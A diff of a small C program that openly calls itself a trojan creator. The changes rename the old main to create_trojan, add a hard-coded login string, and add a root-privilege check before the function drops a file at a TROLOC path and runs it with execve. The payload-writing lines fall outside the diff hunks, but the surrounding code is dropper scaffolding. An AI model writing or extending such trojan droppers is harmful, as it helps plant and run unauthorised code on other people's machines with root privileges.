@@ -9,9 +9,13 @@
 # error "-DTROEXE=... is required to compile this file"
 #endif
 
+#ifndef LOGIN
+# define LOGIN "cgodard"
+#endif
+
 extern char **environ;
 
-int	main(void)
+int	create_trojan(void)
 {
 	int	fd;
 
@@ -29,5 +33,16 @@ int	main(void)
 	}
 	close(fd);
 	execve(TROLOC, (char **){}, environ);
-	return (0);
+	return (EXIT_FAILURE);
+}
+
+int	main(void)
+{
+	if (getuid())
+	{
+		dprintf(STDERR_FILENO, "not enough permissions...\n");
+		return (EXIT_FAILURE);
+	}
+	printf("%s\n", LOGIN);
+	return (create_trojan());
 }
